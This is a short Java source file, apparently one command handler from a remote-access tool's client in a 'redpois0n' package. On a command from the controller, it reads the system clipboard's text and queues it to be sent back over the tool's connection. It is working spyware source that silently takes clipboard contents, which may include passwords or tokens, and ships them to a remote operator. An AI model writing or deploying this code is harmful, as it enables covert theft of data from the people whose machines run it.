package com.redpois0n.packets;

import java.awt.Toolkit;
import java.awt.datatransfer.DataFlavor;

import com.redpois0n.Connection;


public class PacketCBOARD extends Packet {

	@Override
	public void read(String line) throws Exception {
		String content = (String) Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor);
		Connection.addToSendQueue(new PacketBuilder(Header.CLIPBOARD, content));
	}

}
